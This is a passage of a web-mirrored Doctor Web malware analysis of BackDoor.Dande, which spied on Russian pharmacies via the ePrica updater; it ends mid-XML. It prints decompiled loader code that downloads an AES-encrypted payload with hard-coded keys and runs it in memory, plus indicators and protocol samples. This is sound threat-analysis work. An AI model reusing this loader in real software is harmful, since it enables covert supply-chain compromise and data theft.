<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Cyber ‚Äã‚Äãattacks on pharmacies, industrial espionage, insider and 4-year investigation. It would seem, what have the "Peter"?</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Usually we do not tell anyone or anyone about the investigation. Painfully this is a subtle topic. But circumstances almost force :) Yesterday you cou...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Cyber ‚Äã‚Äãattacks on pharmacies, industrial espionage, insider and 4-year investigation. It would seem, what have the "Peter"?</h1><div class="post__text post__text-html js-mediator-article">  Usually we do not tell anyone or anyone about the investigation.  Painfully this is a subtle topic.  But circumstances almost force :) Yesterday you could read the news in simple words, but today we will tell you how it was all technically arranged.  If you missed: we are talking about an update in a post about <a href="https://habrahabr.ru/company/drweb/blog/331878/">Trojan.</a>  <a href="https://habrahabr.ru/company/drweb/blog/331878/">Encoder.12544</a> , also known as Peter, non-Pet, etc.  In a nutshell: <br><br><blockquote>  Back in 2012, virus analysts of Doctor Web revealed a targeted attack on a network of Russian pharmacies and pharmaceutical companies using the BackDoor.Dande malicious program.  This spyware Trojan stole information about the procurement of medicines from specialized programs used in the pharmaceutical industry.  At the time of launch, the backdoor checked whether the corresponding applications for ordering and accounting for the purchases of drugs were installed in the system, and, if they were not available, stopped their work.  Over 2,800 pharmacies and Russian pharmaceutical companies were infected.  Thus, it can be stated with some confidence that BackDoor.Dande was used for industrial espionage. <br><br>  Experts of Doctor Web conducted an investigation that lasted as long as 4 years.  After analyzing the hard drives provided by one of the companies affected by BackDoor.Dande, virus analysts set the date of the creation of the driver, which runs all the other components of the backdoor. </blockquote><br><a name="habracut"></a><blockquote>  Mention of this driver was found in the Windows paging file and the Avast Antivirus log, which was installed on the infected machine.  Analysis of these files showed that the malicious driver was created immediately after the launch of the ePrica application (D: \ ePrica \ App \ PriceCompareLoader.dll).  This application, developed by Spargo Technologies, allows pharmacy managers to analyze the rates for medicines and select the best supplier.  The study of the ePrica program allowed us to establish that it loads into the memory a library that secretly downloads, decrypts and launches BackDoor.Dande in memory.  The Trojan was downloaded from <a href="http://ws.eprica.ru/">ws.eprica.ru</a> , owned by Spargo Technologies, and intended to update the ePrica program.  At the same time, the module that secretly downloaded the malicious program had a valid digital signature ‚ÄúSpargo‚Äù.  The Trojan downloaded the stolen data to servers outside of Russia.  In other words, as in the situation with Trojan.Encoder.12544, the backdoor ‚Äúhid‚Äù in the update module of this program. </blockquote><br>  So, to the point! 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      <b>BackDoor.Dande.61</b> <b><br><br></b>  <b>Added to Dr.Web virus database: 2016-12-08</b> <b><br></b>  <b>Description added: 2017-06-30</b> <br><br><blockquote>  64b57c90bcbf71ae4a28f8f742821c123bfb8061 installer <br>  driver 1 65384de87e53a9249553b6f38c9b48da3ec4e041 <br>  driver 2 1a22a6c9cd04b25a108e08aa6e35637154e5aee6 <br>  Trojan 781262c98f1bdd4e61cd888f71ccc712ff296bf6 <br>  PriceCompareLoader.dll b3915aa38551a5b5270b23e372ae1241161ec598 <br>  PriceComparePm.dll 014a9166c5516a5193b6b638eeae635170f25829 </blockquote><br>  Trojan backdoor designed to steal information about the purchase of medicines from pharmacies and pharmaceutical companies.  Doctor Web has investigated the source of infection with this version of the malware.  In the studied sample, the driver tapec.sys (Dande), which runs all the other components of the Trojan, was created on April 28, 2016: <br><br> <code>04/28/16 11:34:59.9062500000;12/11/02 23:14:32.0000000000;06/16/16 12:28:52.5468750000 C:\Windows\System32\drivers\msteeb.sys <br> 04/28/16 11:35:00.2031250000;04/15/08 17:00:00.0000000000;06/16/16 12:28:52.5312500000 C:\Windows\System32\drivers\tapec.sys <br> 04/28/16 11:35:01.0468750000;12/25/08 22:00:20.0000000000;06/16/16 12:28:53.6250000000 C:\Windows\System32\drivers\telephona.cpl</code> <br> <br>  A search for tapec.sys showed its presence in two files: <br><br> <code>pagefile.sys ( ) <br> Avast\URL.db ( Avast     sqllite3)</code> <br> <br>  The database contains two tables: <br><br> <code>sqlite&gt; .schema <br> CREATE TABLE Paths (Time INTEGER, Path TEXT COLLATE NOCASE UNIQUE, ShortHash INTEGER, LongHash BLOB PRIMARY KEY, Flags INTEGER); <br> CREATE TABLE URLs (Time INTEGER, URL TEXT, ShortHash INTEGER, LongHash BLOB PRIMARY KEY, Flags INTEGER); <br> CREATE INDEX PathsPathIndex ON Paths (Path COLLATE NOCASE); <br> CREATE INDEX URLsShortHashIndex ON URLs (ShortHash);</code> <br> <br>  where Paths is the list of programs that were run on the computer being examined.  Repeated search in the range of one day before and after the creation of the malicious driver revealed two interesting events: <br><br> <code>1461832499|D:\ePrica\App\PriceCompareLoader.dll|2038233152| <br> 1461832500|C:\WINDOWS\system32\drivers\tapec.sys|2510498394|</code> <br> <br>  The malicious driver was created a second after the launch of the D: \ ePrica \ App \ PriceCompareLoader.dll library, which is part of the ePrica application. <br><br>  <b>EPica research</b> <br><br>  ePrica is an application developed by Spargo Technologies, which allows pharmacy managers to analyze the prices for medicines and select the optimal supplier.  The PriceCompareLoader.dll library used by this program has three exported functions: <br><br> <code>MemoryLoadLibrary <br> MemoryGetProcAddress <br> MemoryFreeLibrary</code> <br> <br>  All these functions perform the launch of libraries in memory.  PriceCompareLoader.dll is called from PriceComparePm.dll.  The library is obfuscated using .NET Reactor 4.7.  This library is trying to download the payload from the site, decrypt it using the AES algorithm and run it from memory.  Below is the code to download and run the file: <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Download</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!UpdateDownloader.bool_0) { Guid sessionId = Settings.SESSION.SessionId; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(sessionId == Guid.Empty)) { UpdateService updateService = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> UpdateService(); MyUtils.ConfigureWebServiceProxy(updateService, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> <span class="hljs-meta"><span class="hljs-meta">@int</span></span> = SettingsAllUsers.GetInt(<span class="hljs-string"><span class="hljs-string">"UPDATE_FLAG"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-meta"><span class="hljs-meta">@int</span></span> &gt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) { bool success = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-meta"><span class="hljs-meta">@int</span></span> &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { success = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } DateTime date = SettingsAllUsers.GetDate(<span class="hljs-string"><span class="hljs-string">"UPDATE_FLAG_MODIFIED"</span></span>); updateService.ResetUpdateFlag(sessionId, success, date); SettingsAllUsers.SetDirect(<span class="hljs-string"><span class="hljs-string">"UPDATE_FLAG"</span></span>, -<span class="hljs-number"><span class="hljs-number">1</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (updateService.CheckUpdateFlag(sessionId)) { <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] array = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[UpdateDownloader.qOmraPoxb]; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> num = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] array2 = updateService.Load(sessionId, num); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { array2 = AesEncryptor.Decrypt(array2, UpdateDownloader.byte_0, UpdateDownloader.byte_1); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { num = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> num2 = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (array2 != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) { num2 = array2.Length; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (num2 == <span class="hljs-number"><span class="hljs-number">0</span></span> || num + num2 &gt; UpdateDownloader.qOmraPoxb) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } Array.Copy(array2, <span class="hljs-number"><span class="hljs-number">0</span></span>, array, num, num2); num += num2; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (num &gt; <span class="hljs-number"><span class="hljs-number">0</span></span> &amp;&amp; num &lt;= UpdateDownloader.qOmraPoxb) { Array.Resize&lt;<span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>&gt;(ref array, num); UpdateDownloader.bool_0 = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; Thread thread = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Thread(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ParameterizedThreadStart(UpdateDownloader.smethod_0)); thread.Start(array); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { updateService.ResetUpdateFlag(sessionId, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>, DateTime.get_Now()); } } } } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { } }</code> </pre><br>  Key and vector AES: <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">UpdateDownloader</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ Class3.uNNUGvkzmboS2(); UpdateDownloader.qOmraPoxb = <span class="hljs-number"><span class="hljs-number">2097152</span></span>; UpdateDownloader.byte_0 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] { <span class="hljs-number"><span class="hljs-number">57</span></span>, <span class="hljs-number"><span class="hljs-number">75</span></span>, <span class="hljs-number"><span class="hljs-number">140</span></span>, <span class="hljs-number"><span class="hljs-number">42</span></span>, <span class="hljs-number"><span class="hljs-number">22</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">39</span></span>, <span class="hljs-number"><span class="hljs-number">168</span></span>, <span class="hljs-number"><span class="hljs-number">179</span></span>, <span class="hljs-number"><span class="hljs-number">86</span></span>, <span class="hljs-number"><span class="hljs-number">81</span></span>, <span class="hljs-number"><span class="hljs-number">247</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">224</span></span>, <span class="hljs-number"><span class="hljs-number">242</span></span>, <span class="hljs-number"><span class="hljs-number">23</span></span>, <span class="hljs-number"><span class="hljs-number">154</span></span>, <span class="hljs-number"><span class="hljs-number">186</span></span>, <span class="hljs-number"><span class="hljs-number">128</span></span>, <span class="hljs-number"><span class="hljs-number">130</span></span>, <span class="hljs-number"><span class="hljs-number">171</span></span>, <span class="hljs-number"><span class="hljs-number">200</span></span>, <span class="hljs-number"><span class="hljs-number">170</span></span>, <span class="hljs-number"><span class="hljs-number">128</span></span>, <span class="hljs-number"><span class="hljs-number">217</span></span>, <span class="hljs-number"><span class="hljs-number">247</span></span>, <span class="hljs-number"><span class="hljs-number">238</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-number"><span class="hljs-number">200</span></span>, <span class="hljs-number"><span class="hljs-number">146</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span> }; UpdateDownloader.byte_1 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] { <span class="hljs-number"><span class="hljs-number">88</span></span>, <span class="hljs-number"><span class="hljs-number">199</span></span>, <span class="hljs-number"><span class="hljs-number">157</span></span>, <span class="hljs-number"><span class="hljs-number">130</span></span>, <span class="hljs-number"><span class="hljs-number">155</span></span>, <span class="hljs-number"><span class="hljs-number">231</span></span>, <span class="hljs-number"><span class="hljs-number">168</span></span>, <span class="hljs-number"><span class="hljs-number">148</span></span>, <span class="hljs-number"><span class="hljs-number">97</span></span>, <span class="hljs-number"><span class="hljs-number">45</span></span>, <span class="hljs-number"><span class="hljs-number">227</span></span>, <span class="hljs-number"><span class="hljs-number">215</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>, <span class="hljs-number"><span class="hljs-number">234</span></span>, <span class="hljs-number"><span class="hljs-number">61</span></span>, <span class="hljs-number"><span class="hljs-number">172</span></span> }; }</code> </pre> <br>  Update verification code: <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">smethod_0</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(object object_0)</span></span></span><span class="hljs-function"> </span></span>{ bool flag = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] array = object_0 as <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (array != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) { SettingsAllUsers.SetDirect(<span class="hljs-string"><span class="hljs-string">"UPDATE_FLAG"</span></span>, -<span class="hljs-number"><span class="hljs-number">2</span></span>); flag = CheckUpdate.Check(array); } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (flag) { SettingsAllUsers.SetDirect(<span class="hljs-string"><span class="hljs-string">"UPDATE_FLAG"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { SettingsAllUsers.SetDirect(<span class="hljs-string"><span class="hljs-string">"UPDATE_FLAG"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); } SettingsAllUsers.SetDirect(<span class="hljs-string"><span class="hljs-string">"UPDATE_FLAG_MODIFIED"</span></span>, DateTime.get_Now()); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { } UpdateDownloader.bool_0 = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } }</code> </pre> <br>  Startup code from memory: <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> bool </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Check</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] byte_0)</span></span></span><span class="hljs-function"> </span></span>{ IntPtr intPtr = IntPtr.Zero; IntPtr intPtr2 = IntPtr.Zero; <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (byte_0 == <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) { bool result = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> result; } intPtr2 = Marshal.AllocHGlobal(byte_0.Length); Marshal.Copy(byte_0, <span class="hljs-number"><span class="hljs-number">0</span></span>, intPtr2, byte_0.Length); intPtr = CheckUpdate.Class1.MemoryLoadLibrary(intPtr2); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intPtr == IntPtr.Zero) { bool result = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> result; } IntPtr intPtr3 = CheckUpdate.Class1.MemoryGetProcAddress(intPtr, <span class="hljs-string"><span class="hljs-string">"ModuleFunction"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intPtr3 == IntPtr.Zero) { bool result = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> result; } CheckUpdate.Delegate0 <span class="hljs-meta"><span class="hljs-meta">@delegate</span></span> = (CheckUpdate.Delegate0)Marshal.GetDelegateForFunctionPointer(intPtr3, typeof(CheckUpdate.Delegate0)); <span class="hljs-meta"><span class="hljs-meta">@delegate</span></span>(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { bool result = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> result; } <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intPtr != IntPtr.Zero) { CheckUpdate.Class1.MemoryFreeLibrary(intPtr); } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intPtr2 != IntPtr.Zero) { Marshal.FreeHGlobal(intPtr2); } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> { } } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br>  <b>Protocol</b> <br><br>  The library communicates with a remote server using the SOAP HTTP protocol.  For authorization, a POST request is sent to the server <a href="">ws.eprica.ru/app/InfoService.asmx</a> with the following header: <br><br> <code>'SOAPAction': "http://www.spargo.ru/es/LoginEx"</code> <br> <br>  The data for authorization has the following structure: <br><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:soap</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoginEx</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.spargo.ru/es"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">wsUser</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LicenseNumber</span></span></span><span class="hljs-tag">&gt;</span></span>071122-164229<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LicenseNumber</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SessionId</span></span></span><span class="hljs-tag">&gt;</span></span>00000000-0000-0000-0000-000000000000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SessionId</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GuidDrugstore</span></span></span><span class="hljs-tag">&gt;</span></span>00000000-0000-0000-0000-000000000000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GuidDrugstore</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">KodDrugstore</span></span></span><span class="hljs-tag">&gt;</span></span>105570<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">KodDrugstore</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Login</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Login</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PasswordHash</span></span></span><span class="hljs-tag">&gt;</span></span>/9P+uFEEaqgoKiKOQOZnOw==<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PasswordHash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Version</span></span></span><span class="hljs-tag">&gt;</span></span>4.0.26.30<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Version</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ComputerInfoHash</span></span></span><span class="hljs-tag">&gt;</span></span>NVQKLJBTV1<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ComputerInfoHash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AccessCode</span></span></span><span class="hljs-tag">&gt;</span></span>ED287118-3933-4E97-95A7-9D3C4CF94421<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AccessCode</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">DownloadedUpdateVersion</span></span></span><span class="hljs-tag">&gt;</span></span>4.0.23.17<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">DownloadedUpdateVersion</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">wsUser</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">password</span></span></span><span class="hljs-tag">&gt;</span></span>1230456<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">password</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoginEx</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  In response, a sessionId of the following form arrives: <br><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Envelope</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:soap</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">soap:Body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">LoginExResponse</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span 